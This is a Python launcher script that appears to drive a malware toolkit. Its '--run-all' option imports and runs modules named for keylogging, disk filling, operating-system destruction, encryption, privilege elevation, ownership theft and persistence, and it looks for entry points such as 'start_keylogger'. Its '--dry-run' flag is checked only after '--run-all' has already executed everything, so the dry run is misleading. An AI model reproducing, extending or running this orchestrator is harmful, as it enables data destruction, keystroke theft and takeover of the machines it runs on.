"""Compact entry point for the project."""

import argparse
import importlib
import inspect
import runpy
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent
for path in (ROOT, ROOT.parent):
    path_str = str(path)
    if path_str not in sys.path:
        sys.path.insert(0, path_str)


def _resolve_callable(module, function_name=None, attr=None):
    if attr:
        return getattr(module, attr, None)

    if function_name:
        if function_name == "__main__":
            return "__main__"
        if "." in function_name:
            obj = module
            for part in function_name.split("."):
                if not hasattr(obj, part):
                    return None
                obj = getattr(obj, part)
            return obj if callable(obj) else None
        return getattr(module, function_name, None)

    for candidate in ("main", "run", "start", "execute", "codeTest", "start_keylogger", "start_cmd", "start_powershell"):
        target = getattr(module, candidate, None)
        if callable(target):
            return target
    return None


def _invoke_target(target, module, function_name):
    if not callable(target):
        return False

    if function_name and "." in function_name:
        class_name, method_name = function_name.split(".", 1)
        cls = getattr(module, class_name, None)
        if inspect.isclass(cls):
            instance = cls()
            method = getattr(instance, method_name, None)
            if callable(method):
                print(f"Running {module.__name__}.{function_name}")
                method()
                return True

    print(f"Running {module.__name__}.{function_name or '<default>'}")
    target()
    return True


def run_module(module_name, function_name=None, attr=None):
    module_name = module_name.strip()
    if ":" in module_name:
        module_name, function_name = module_name.split(":", 1)

    if function_name is None and "." in module_name:
        parts = module_name.split(".")
        if len(parts) > 1:
            possible_module = ".".join(parts[:-1])
            possible_function = parts[-1]
            try:
                importlib.import_module(possible_module.replace("/", ".").replace("\\", "."))
                module_name = possible_module
                function_name = possible_function
            except Exception:
                pass

    normalized_name = module_name.replace("\\", ".").replace("/", ".")
    if normalized_name.startswith("."):
        normalized_name = normalized_name[1:]

    if function_name == "__main__":
        module_path = Path(__file__).resolve().parent / (normalized_name.replace(".", "\\") + ".py")
        if not module_path.exists():
            print(f"{module_name} unavailable")
            return False

        print(f"Running {normalized_name} as a module")
        runpy.run_path(str(module_path), run_name="__main__")
        return True

    try:
        module = importlib.import_module(normalized_name)
    except Exception as exc:
        print(f"{module_name} unavailable: {exc}")
        return False

    target = _resolve_callable(module, function_name=function_name, attr=attr)
    if callable(target):
        return _invoke_target(target, module, function_name or "<default>")

    if function_name:
        print(f"{module_name}.{function_name} unavailable")
    else:
        print(f"{module_name} has no callable entry point")
    return False


def main():
    parser = argparse.ArgumentParser(description="Simple project entry point")
    parser.add_argument("--os-info", action="store_true")
    parser.add_argument("--start-terminal", action="store_true")
    parser.add_argument("--start-cmd", action="store_true")
    parser.add_argument("--start-powershell", action="store_true")
    parser.add_argument(
        "--module",
        action="append",
        help="Run a module entrypoint by dotted path. Use module:function to specify a function.",
    )
    parser.add_argument(
        "--function",
        help="Default function name to run for each --module entry when no module-specific function is provided.",
    )
    parser.add_argument("--run-all", action="store_true")
    parser.add_argument("--dry-run", action="store_true", help="Show what would be executed without running it")
    args = parser.parse_args()

    if args.os_info:
        from platform_mod.platform_utils import get_os_type
        print(get_os_type())
    if args.start_terminal:
        from core.manager import TerminalManager
        TerminalManager().start_terminal()
    if args.start_cmd:
        from platform_mod.mycmd import start_cmd
        start_cmd()
    if args.start_powershell:
        from platform_mod.powershell import start_powershell
        start_powershell()

    if args.run_all:
        modules = [
            "collection.disk_fill",
            "collection.keylogger",
            "collection.os_destroyer",
            "core.background_runner",
            "core.base",
            "core.manager",
            "crypto.encryption_key_manager",
            "crypto.encryptor1",
            "persistence.keyboard_interrupt_suppress",
            "persistence.os_root_save",
            "persistence.ownership_steal",
            "platform_mod.android_shell_util",
            "platform_mod.elevate",
            "platform_mod.mycmd",
            "platform_mod.platform_utils",
            "platform_mod.powershell",
            "platform_mod.shells",
        ]
        for name in modules:
            run_module(name, function_name=args.function)

    if args.dry_run:
        if args.module:
            for spec in args.module:
                print(f"Dry run: would execute {spec}")
        elif args.run_all:
            print("Dry run: would execute all discovered modules")
        return

    if args.module:
        for spec in args.module:
            run_module(spec, function_name=args.function)


if __name__ == "__main__":
    main()
